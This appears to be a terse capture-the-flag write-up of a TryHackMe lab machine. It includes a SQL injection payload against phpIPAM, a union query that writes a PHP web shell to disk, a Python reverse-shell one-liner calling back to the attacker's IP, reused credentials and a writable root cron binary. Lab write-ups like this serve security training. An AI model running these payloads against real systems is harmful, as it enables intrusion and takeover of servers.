> VOiD XD

My IP : 10.8.253.221
Target IP : 10.10.188.177


## Rustscan
```bash
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
1337/tcp open  waste   syn-ack


```

## PORT 1337
```bash
nc 10.10.188.177 1337                                                         1 ⨯
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? olie
What's up, Olie! It's been a while. What are you here for? flag
Ya' know what? Olie. If you can answer a question about me, I might have something for you.


What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Bulldog
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
Please hold on a minute
Ok, I'm back.
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: admin

                    Password: OllieUnixMontgomery!

PS: Good luck and next time bring some treats!

```

## PORT 80
```bash
http://10.10.188.177/index.php?page=login

checking exploits gives
https://fluidattacks.com/advisories/mercury/

http://10.10.188.177/index.php?page=administration&section=routing&subnetId=bgp&sPage=1

" union all select 1,2,3,group_concat(user,0x3a,file_priv) from mysql.user -- -

 1/3 (debian-sys-maint:Y,
    mysql.infoschema:N,
    mysql.session:N,
    mysql.sys:N,
    ollie_mysql:Y,
    phpipam_ollie:Y,
    root:Y)

we have file permissions

we have a simple web shell
<?php system($_GET["cmd"]); ?>

" Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '/var/www/html/shell.php' -- -

http://10.10.188.177/shell.php?cmd=which%20python3

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.253.221",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Shell [www-data]
```bash
su ollie
OllieUnixMontgomery!

ollie@hackerdog:~$ cat user.txt 
THM{Ollie_boi_is_daH_Cut3st}

pspy gives
2022/04/21 16:13:00 CMD: UID=0    PID=37817  | (feedme) 

ollie@hackerdog:/usr/bin$ ls -la feedme 
-rwxrw-r-- 1 root ollie 30 Feb 12 02:31 feedme

# cat root.txt
THM{Ollie_Luvs_Chicken_Fries}
```